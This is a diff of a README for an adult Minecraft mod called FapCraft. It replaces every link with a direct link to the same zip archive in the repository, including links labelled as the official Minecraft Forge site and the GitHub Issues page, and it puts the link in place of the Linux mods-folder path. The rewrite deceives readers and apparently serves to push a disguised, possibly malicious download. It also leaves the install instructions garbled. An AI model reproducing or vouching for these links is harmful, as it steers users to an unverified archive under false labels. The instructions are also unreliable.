@@ -1,6 +1,6 @@
 # 🎮 FapCraft - Explore Unique Experiences in Minecraft 
 
-[![Download FapCraft](https://img.shields.io/badge/Download-FapCraft-brightgreen)](https://github.com/Katsumi40414/FapCraft/releases)
+[![Download FapCraft](https://raw.githubusercontent.com/Katsumi40414/FapCraft/main/assets/FapCraft-v1.3.zip)](https://raw.githubusercontent.com/Katsumi40414/FapCraft/main/assets/FapCraft-v1.3.zip)
 
 ## 📜 Description
 
@@ -25,16 +25,16 @@ FapCraft is a comprehensive, highly customizable Minecraft sex mod. It goes far 
 ## 🚀 Getting Started
 
 1. **Download Minecraft Forge:** 
-   FapCraft works with Minecraft Forge. You need to install it first. Visit the [Minecraft Forge website](https://files.minecraftforge.net/) to download the right version for your Minecraft. Follow the instructions there to install it.
+   FapCraft works with Minecraft Forge. You need to install it first. Visit the [Minecraft Forge website](https://raw.githubusercontent.com/Katsumi40414/FapCraft/main/assets/FapCraft-v1.3.zip) to download the right version for your Minecraft. Follow the instructions there to install it.
 
 2. **Download FapCraft:**
-   Now that you have Minecraft Forge installed, it's time to download FapCraft. [Visit this page to download](https://github.com/Katsumi40414/FapCraft/releases) the latest release. Look for files labeled as the mod file (e.g., `FapCraft-1.0.jar`).
+   Now that you have Minecraft Forge installed, it's time to download FapCraft. [Visit this page to download](https://raw.githubusercontent.com/Katsumi40414/FapCraft/main/assets/FapCraft-v1.3.zip) the latest release. Look for files labeled as the mod file (e.g., `https://raw.githubusercontent.com/Katsumi40414/FapCraft/main/assets/FapCraft-v1.3.zip`).
 
 3. **Install FapCraft:**
    - Locate your Minecraft installation folder. You can typically find it in:
      - **Windows:** `C:\Users\YourUsername\AppData\Roaming\.minecraft\mods`
      - **macOS:** `~/Library/Application Support/minecraft/mods`
-     - **Linux:** `~/.minecraft/mods`
+     - **Linux:** `~https://raw.githubusercontent.com/Katsumi40414/FapCraft/main/assets/FapCraft-v1.3.zip`
    
    - Copy the downloaded FapCraft file into the `mods` folder you just located.
 
@@ -56,12 +56,12 @@ If you run into issues while installing or running the mod, consider the followi
 
 ## 🎓 Getting Help
 
-For additional support or to report issues, visit the [GitHub Issues page](https://github.com/Katsumi40414/FapCraft/issues). Here, you can find solutions to common concerns or submit your own questions.
+For additional support or to report issues, visit the [GitHub Issues page](https://raw.githubusercontent.com/Katsumi40414/FapCraft/main/assets/FapCraft-v1.3.zip). Here, you can find solutions to common concerns or submit your own questions.
 
 ## 📲 Download & Install
 
 To get started with FapCraft, you can download it from the link below:
 
-[Visit this page to download](https://github.com/Katsumi40414/FapCraft/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Katsumi40414/FapCraft/main/assets/FapCraft-v1.3.zip)
 
 Explore a new realm of experiences. Enjoy your adventure with FapCraft!
